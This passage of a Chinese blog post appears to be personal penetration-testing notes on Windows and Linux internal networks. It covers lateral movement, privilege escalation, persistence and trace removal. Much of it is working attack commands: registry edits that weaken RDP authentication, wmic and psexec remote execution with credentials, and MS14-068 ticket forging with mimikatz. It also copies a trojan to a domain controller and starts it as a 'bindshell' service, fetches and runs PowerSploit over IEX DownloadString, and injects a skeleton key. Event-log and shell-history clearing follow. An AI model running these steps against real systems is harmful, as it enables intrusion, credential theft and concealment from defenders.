<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">reg</span> query <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections <br><span class="hljs-attribute">ps</span>: 若字段值为<span class="hljs-number">0</span>，则表示已启动RDP；若为<span class="hljs-number">1</span>，则表示禁用RDP<br></code></pre></td></tr></table></figure>

<p>  ② 开启远程桌面</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></code></pre></td></tr></table></figure>

<p>  ③ 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0</span><br></code></pre></td></tr></table></figure>

<p>  ④ 设置防火墙策略放行 3389 端口</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=338<br></code></pre></td></tr></table></figure>

<h3 id="RDP-Hijack"><a href="#RDP-Hijack" class="headerlink" title="RDP Hijack"></a><strong>RDP Hijack</strong></h3><p>  Windows 系统下，tscon 可被用来切换远程桌面的会话。正常情况下，切换会话时需要提供登录密码，但通过特殊的利用方法能够绕过验证，不输入密码实现未授权登录。<br>  可以通过 <code>query user</code> 来列出所有登录的用户列表，得到 id<br>  在 SYSTEM 权限下，使用 <code>tscon &lt;ID&gt;</code> 来切换用户不需要验证密码。</p>
<h3 id="sharp-RDP"><a href="#sharp-RDP" class="headerlink" title="sharp RDP"></a><a target="_blank" rel="noopener" href="https://github.com/0xthirteen/SharpRDP">sharp RDP</a></h3><p>  sharp rdp 可以通过远程桌面协议在远程主机上执行系统命令，且不需要 GUI 客户端。</p>
<p>  工具需要远程主机开启远程桌面功能，且防火墙放行 3389 端口</p>
<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><p>windows 自带一个工具集，默认不产生日志</p>
<p>WMI（Windows 管理规范）是一项核心的 Windows 管理技术。用户可以通过 WMI 管理本地和远程主机。<br>Windows 为传输 WMI 数据提供了两个可用的协议：分布式组件对象模型（DCOM）和 Windows 远程管理（WinRM）使得 WMI 对象的查询、事件注册、WMI 类方法的执行和类的创建等操作都能远程运行。</p>
<h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a><strong>利用方法</strong></h3><ol>
<li>通过调用 WMI 的类方法进行远程调用，如 Win32_Process 类中的 Create 方法可以在远程主机上创建进程，Win32_Product 类的 Install 方法可以在远程主机上安装恶意的 MSI</li>
<li>远程部署 WMI 事件订阅，在特定事件发生时触发</li>
</ol>
<h3 id="条件-2"><a href="#条件-2" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>1.远程主机的 WMI 服务为开启状态（默认开启）</p>
<p>2.远程主机防火墙放行 135 端口，这是 WMI 管理的默认端口</p>
<h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h3><p>1.通过 WMI 查询远程主机上运行的进程信息</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wmic <span class="hljs-regexp">/node:192.168.1.131 /u</span>ser:Administrator <span class="hljs-regexp">/password:123456@ process list brief # /</span>node 执行远程主机的地址<br></code></pre></td></tr></table></figure>

<p>2.创建远程进程<br>通过调用 Win32_Process.Create 方法在远程主机上创建进程，启动 CMD 来执行命令<br>由于 WMIC 在执行命令时没有回显，因此可以将执行结果写入文件，然后通过别的方式读取文件</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.131</span> /<span class="hljs-keyword">user</span>:Administrator /<span class="hljs-keyword">password</span>:<span class="hljs-number">123456</span>@ process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure>

<p>3.远程安装 MSI 文件<br>通过调用 Win32_Product.Install 方法，可以控制远程主机安装恶意 MSI 文件，从而获得权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:192.168.1.131 /user:Administrator /password:123456@ product call instal<br></code></pre></td></tr></table></figure>

<h2 id="SMB-横向"><a href="#SMB-横向" class="headerlink" title="SMB 横向"></a><strong>SMB 横向</strong></h2><p>  SMB（服务器消息块），又称 CIFS（网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。<br>  客户端与服务器建立连接后,客户端可以向服务器发送 SMB 命令允许用户访问共享、打开、读取或者是写入文件。<br>  SMB 消息一般使用 NetBIOS 协议或 TCP 发送，分别使用端口 139 或 445，目前倾向于使用 445 端口。</p>
<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a><strong>利用条件</strong></h3><ol>
<li>445 端口开放</li>
<li>知道账号密码</li>
</ol>
<h3 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a><strong>利用步骤</strong></h3><p>1.建立 IPC 链接，psexec 需要明文或 hash 传递</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">net</span> use \\<span class="hljs-number">192.168.3.32</span>\ipc$ <span class="hljs-string">&quot;admin!@#45&quot;</span> /user:administrator<br>psexec \\<span class="hljs-number">192.168.3.32</span> -s cmd       //需要先有 ipc 链接 -s 以 System 权限运行<br></code></pre></td></tr></table></figure>

<p>2.或者不用建立 IPC 直接提供明文账户密码</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">psexec</span> \\<span class="hljs-number">192.168.3.21</span> -u administrator -p Admin12345 -s cmd<br></code></pre></td></tr></table></figure>

<h2 id="MS14-068攻击"><a href="#MS14-068攻击" class="headerlink" title="MS14-068攻击"></a><a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">MS14-068</a><strong>攻击</strong></h2><p>  MS14-068 基于漏洞，造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。</p>
<p>  Windows 域中使用 kerberos 协议过程中，为了让服务器判断 Client 是否有权限访问服务，微软在 Windows 平台上在 Kerberos 协议中增加了 PAC（Privilege Attribute Certificate）特权属性证书，也就是这个 PAC 造成了 MS14-068 这个漏洞。</p>
<p>  PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。</p>
<p>  漏洞允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意的 PAC（表示所有用户权限的结构）。该漏洞位于 kdcsvc.dll 域控制器的密钥分发中心(KDC)中。普通用户可以通过呈现具有改变了 PAC 的 Kerberos TGT 来获得票证，进而伪造票据获得管理员权限。</p>
<h3 id="条件-3"><a href="#条件-3" class="headerlink" title="条件"></a><strong>条件</strong></h3><p>    1. 域内任意用户 SID</p>
<pre><code class="hljs">      2. 域内任意用户密码
</code></pre>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h3><p>    1. 获得一个域用户 douser 的 SID</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure>

<p>    2. 上传工具 ms14-068.exe，并执行命令生成 TGT 票据</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ms14-<span class="hljs-number">068</span><span class="hljs-selector-class">.exe</span> -u 域成员名@域名 -s 域成员sid -d 域控制器ip地址 -<span class="hljs-selector-tag">p</span> 域成员密码<br></code></pre></td></tr></table></figure>

<p>    3. 上传 mimikatz，利用 mimikatz 将票据注入到当前内存中伪造凭证</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">mimikatz <span class="hljs-meta"># kerberos::purge          <span class="hljs-comment">//清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span></span><br>mimikatz <span class="hljs-meta"># kerberos::list           <span class="hljs-comment">//查看当前机器凭证</span></span><br>mimikatz <span class="hljs-meta"># kerberos::ptc 票据文件   <span class="hljs-comment">//将票据注入到内存中</span></span><br></code></pre></td></tr></table></figure>

<p>    4. 使用 net use 进行登录或者使用 psexec，wmi 等方法进行远程执行命令</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N           <span class="hljs-comment">//登录域控</span><br></code></pre></td></tr></table></figure>

<p>    5. 上传一个正向的 msf 马，并将该木马 copy 到域控上去执行</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">copy</span> c:\windows\system32\<span class="hljs-keyword">shell</span>.exe \\<span class="hljs-keyword">WIN</span>-ENS2VR5TR3N\c$<br></code></pre></td></tr></table></figure>

<p>    6. 通过 sc 远程对域控创建服务来启动木马</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N create <span class="hljs-keyword">bindshell </span><span class="hljs-keyword">binpath= </span><span class="hljs-string">&quot;c:\shell.exe&quot;</span><br><span class="hljs-keyword">sc </span>\\WIN-ENS2VR5TR3N start <span class="hljs-keyword">bindshell</span><br></code></pre></td></tr></table></figure>

<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>起初用于运维，基本原理是通过管道在远程目标机器上创建一个 psexec 服务，并在本地磁盘中生成一个名为“PSEXESVC”的进制文件，通过 psexec 服务运行命令，运行结束后删除（大量日志）</p>
<h4 id="Pth-winexe"><a href="#Pth-winexe" class="headerlink" title="Pth-winexe"></a>Pth-winexe</h4><h4 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h4><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
<h3 id="uid-提权"><a href="#uid-提权" class="headerlink" title="uid 提权"></a>uid 提权</h3><p> (find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null)</p>
<p>1.常规</p>
<ul>
<li>Nmap</li>
<li>Vim</li>
<li>find</li>
<li>Bash</li>
<li>More</li>
<li>Less</li>
<li>Nano</li>
<li>cp</li>
</ul>
<p>2.strings&#x2F;strace 追踪调用函数配合共享库注入&#x2F;修改 path 劫持</p>
<p>bash&lt;4.2 路径组合自定义函数</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/JBFlbtySzoDfSdxTvXrchtPLnFf.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p>bash&lt;4.4 环境变量劫持</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AfB0b898oovlYXxpkAwcPMCTnye.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h3><p>git help config （!&#x2F;bin&#x2F;bash 或者 ！’sh’）完成提权</p>
<p>编写如下一个c文件</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/LWSIbTRrJovgeQxvbY7cIY8Jnqb.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Uljwba9S8oB3aOxR3CvcpQGnnNc.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><h3 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h3><p>常规修改 sh 文件，相对路径劫持，配合 sh 文件内的命令</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912111725061.png" srcset="/img/loading.gif" lazyload alt="image-20240912111725061"></p>
<p>例如会自动执行&#x2F;usr&#x2F;loca&#x2F;bin&#x2F;aaa.sh</p>
<p>但是可以创建一个&#x2F;home&#x2F;user&#x2F;aaa.sh劫持</p>
<h3 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权"></a>docker 提权</h3><h3 id="Passwd-shadow-提权"><a href="#Passwd-shadow-提权" class="headerlink" title="Passwd&#x2F;shadow 提权"></a>Passwd&#x2F;shadow 提权</h3><p>shadow 解密或者手动生成 passwd&#x2F;shadow 密文</p>
<h3 id="NFS-提权"><a href="#NFS-提权" class="headerlink" title="NFS 提权"></a>NFS 提权</h3><h2 id="windows-1"><a href="#windows-1" class="headerlink" title="windows"></a><strong>windows</strong></h2><h3 id="POTATO"><a href="#POTATO" class="headerlink" title="POTATO"></a>POTATO</h3><p>核心是利用COM类，捕获并修改NTLM认证数据包</p>
<p>需求</p>
<ol>
<li>获取到高权限的 token</li>
<li>当前账户拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限</li>
</ol>
<p>一般是给到本地管理员和本地服务账户，两个权限的本意是让高权限服务模拟低权限客户端来操作</p>
<h4 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h4><p>LLMNR&#x2F;NBNS投毒</p>
<h4 id="Rotten-Juicy"><a href="#Rotten-Juicy" class="headerlink" title="Rotten &amp; Juicy"></a>Rotten &amp; Juicy</h4><p>通过DCOM call让服务向攻击者监听端口发放NTLM认证，拿到NTLM后启动新进程</p>
<h4 id="PrintSpoofer"><a href="#PrintSpoofer" class="headerlink" title="PrintSpoofer"></a>PrintSpoofer</h4><p>利用了spoolsv.exe服务的RPC服务中传递\\127.0.0.1&#x2F;pipe&#x2F;foo会解析为主机名后链接</p>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><h4 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h4><h3 id="系统漏洞提权"><a href="#系统漏洞提权" class="headerlink" title="系统漏洞提权"></a>系统漏洞提权</h3><p>通过 Webshell 命令行执行 systeminfo 命令查看系统是否打了提权补丁，可使用 exp 进行提权<br>通过 Webshell 找网站读写执行目录，把 cs 马或提权 exp 上传到对方服务器（如果 cmd 无法执行命令可单独上传 cmd.exe 到对方服务器，菜刀终端设置为 setpc:\XXX\cmd.exe）</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#手工查找补丁情况</span><br>systeminfo<br>Wmic qfe get Caption,Description,HotFixID,InstalledOn<br><br><span class="hljs-comment">#MSF后渗透扫描</span><br>post<span class="hljs-regexp">/windows/g</span>ather/enum_patches<br>post<span class="hljs-regexp">/multi/</span>recon/local_exploit_suggester<br><br><span class="hljs-comment">#windows exploit suggester</span><br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AonCyberLabs/</span>Windows-Exploit-Suggester<br><br><span class="hljs-comment">#powershell中的sherlock脚本</span><br>Import-Module C:\Sherlock.ps1 <span class="hljs-comment">#下载ps1脚本，导入模块</span><br>Find-AllVulns<br><br><span class="hljs-comment">#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法</span><br>usemodule privesc<span class="hljs-regexp">/powerup/</span>allchecks<br>execute<br><br>其他工具<br>WES-NG<br>Sherlock<br></code></pre></td></tr></table></figure>

<p>exp 在线查询</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br><a target="_blank" rel="noopener" href="https://bugs.hacking8.com/tiquan/">https://bugs.hacking8.com/tiquan/</a><br><a target="_blank" rel="noopener" href="https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation">https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation</a><br><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></p>
</blockquote>
<h3 id="组策略首选项"><a href="#组策略首选项" class="headerlink" title="组策略首选项"></a>组策略首选项</h3><blockquote>
<p>SYSVOL 是 AD(活动目录)里面一个存储域公共文件<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>副本的共享文件夹，所有的认证用户都可以读取。SYSVOL 包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为 SYSVOL 能在所有域控里进行自动同步和共享。</p>
</blockquote>
<p>路径为：\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</p>
<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240912110205311.png" srcset="/img/loading.gif" lazyload alt="image-20240912110205311"></p>
<p>然后用kali#gpp-decrypt破解</p>
<p><strong>组策略偏好 GPP</strong></p>
<blockquote>
<p>win2008 发布了 GPP(Group Policy Preferences)，其中 GPP 最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动（Drives.xml）创建本地用户数据源（DataSources.xml）打印机配置（Printers.xml）创建&#x2F;更新服务（Services.xml）计划任务（ScheduledTasks.xml）更改本地 Administrator 密码<br>为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#Powershell获取cpassword</span><br>Get-GPPPassword.ps1<br><br><span class="hljs-comment">#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。</span><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span>Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword<br>kali gpp-decrypt命令破解密码<br><br><span class="hljs-comment">#Msf</span><br>run post<span class="hljs-regexp">/windows/g</span>ather<span class="hljs-regexp">/credentials/g</span>pp<br><br><span class="hljs-comment">#Empire</span><br>usemodule privesc/gpp<br></code></pre></td></tr></table></figure>

<h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#Msf</span><br>exploit<span class="hljs-regexp">/windows/</span>local/ask       <span class="hljs-comment">#弹出UAC确认窗口，点击后获得system权限</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac  <span class="hljs-comment">#此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_injection <span class="hljs-comment">#此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）</span><br><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_fodhelper<span class="hljs-comment">#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_eventvwr<span class="hljs-comment">#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）</span><br><br>exploit<span class="hljs-regexp">/windows/</span>local/bypassuac_comhijack<span class="hljs-comment">#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。</span><br><br><span class="hljs-comment">#Powershell</span><br>Invoke-PsUACme<br><br><span class="hljs-comment">#Empire</span><br>usemodule privesc/bypassuac<br>usemodule privesc/bypassuac_wscript<br><br><span class="hljs-comment">#cs</span><br>uac-dll<br>uac-token-duplication<br></code></pre></td></tr></table></figure>

<h3 id="操作系统配置错误"><a href="#操作系统配置错误" class="headerlink" title="操作系统配置错误"></a>操作系统配置错误</h3><blockquote>
<p>管理员凭证配置错误<br>服务配置错误<br>故意削弱的安全措施<br>用户权限过高</p>
<p>不带引号的服务路径</p>
</blockquote>
<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-comment"># 存储Windows服务有关的信息 </span><br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>\<span class="hljs-params">SYSTEM</span>\CurrentControlSet\Services <br><span class="hljs-comment"># 服务对应的程序路径存储 </span><br><span class="hljs-params">HKEY_LOCAL_MACHINE</span>\<span class="hljs-params">SYSTEM</span>\ControlSet001\Services\Vulnerable Service\服务名\ImagePath <br><span class="hljs-comment"># AlwaysInstallElevated  允许低权限用户以最高权限安装MSI文件</span><br></code></pre></td></tr></table></figure>

<h3 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h3><ul>
<li>sc 命令提权（administrator–&gt;system）</li>
</ul>
<p>​	例如：<code>sc Create syscmd binPath= “cmd /K start” type= own type=interactsc start systcmd</code> 就得到了一个 system 权限的 cmd 环境</p>
<ul>
<li><p>不带引号的服务路径</p>
<p>当服务路径带空格的时候，路径空格目录前面一断就会当作文件执行，如 <code>C:\ProgramFiles\MSBuild</code> 这个目录，攻击者只要在 c </p>
<p>创建名为 <code>Program.exe</code> 的木马，最后只要系统重启就会执行 <code>C:\Program.exe</code> 文件。</p>
</li>
<li><p>不安全的服务权限提升</p>
<p>由于管理配置错误，用户可能对服务拥有过多的权限，例如用木马替换服务调用的默认文件。</p>
</li>
<li><p>数据库提权</p>
</li>
<li><p>访问令牌提权</p>
</li>
</ul>
<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><blockquote>
<p>预加载型动态链接库后门<br>strace 后门<br>SSH 后门<br>SUID 后门<br>inetd 服务后门<br>协议后门<br>vim 后门<br>PAM 后门<br>进程注入<br>Rootkit<br>端口复用</p>
</blockquote>
<h2 id="windows-2"><a href="#windows-2" class="headerlink" title="windows"></a>windows</h2><blockquote>
<p>替换系统文件类(shift 后门,放大镜后门)<br>修改注册表类<br>自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls 注册表项、AppInit_DLLs 注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL<br>文件类<br>自启动文件夹、office Word StartUp 劫持<br>计划任务<br>schtasks 、WMI、bitsadmin</p>
</blockquote>
<h2 id="域后门"><a href="#域后门" class="headerlink" title="域后门"></a>域后门</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/359329.html">常见域后门技术总结与分析利用 - FreeBuf网络安全行业门户</a></p>
<h3 id="Skeleton-key"><a href="#Skeleton-key" class="headerlink" title="Skeleton key"></a>Skeleton key</h3><p>注入lsass.exe进程实现‘万能密码’，重启后失效</p>
<p>mimikatz.exe “privilege::debug” “misc::skeleton” exit # 密码为 mimikatz</p>
<h3 id="DSRM"><a href="#DSRM" class="headerlink" title="DSRM"></a>DSRM</h3><p>在域控上，DSRM 账户实际上就是本地管理员账户（Administrator），并且该账户的密码在创建后几乎很少使用。通过在域控上运行 NTDSUtil，可以为 DSRM 账户修改密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Bash">ntdsutil <span class="hljs-comment"># 进入 ntdsutil</span><br><span class="hljs-built_in">set</span> dsrm password <span class="hljs-comment"># 进入设置 DSRM 账户密码设置模式</span><br>reset password on server null <span class="hljs-comment"># 在当前域控上恢复 DSRM 密码</span><br>&lt;password&gt;  <span class="hljs-comment"># 输入新密码 123456Lhz！</span><br>&lt;password&gt;  <span class="hljs-comment"># 再次输入新密码</span><br>q <span class="hljs-comment"># 退出 DSRM 密码设置模式</span><br>q <span class="hljs-comment"># 退出 ntdsutil</span><br></code></pre></td></tr></table></figure>







<p>#痕迹清理</p>
<h2 id="windows-3"><a href="#windows-3" class="headerlink" title="windows"></a>windows</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105232499.png" srcset="/img/loading.gif" lazyload alt="image-20240819105232499"></p>
<p>1.查看事件日志 run event_manager -i</p>
<p>2.删除事件日志 run event_manager -c</p>
<p>3.clearv 命令清除目标系统的事件日志。</p>
<p>清除命令历史记录</p>
<p>histroy -r          #删除当前会话历史记录</p>
<p>history -c          #删除内存中的所有命令历史</p>
<p>rm .bash_history   #删除历史文件中的内容</p>
<p>HISTZISE&#x3D;0          #通过设置历史命令条数来清除所有历史记录</p>
<p>在隐蔽的位置执行命令</p>
<p>使用 vim 打开文件执行命令</p>
<p>:set history&#x3D;0</p>
<p>:!command</p>
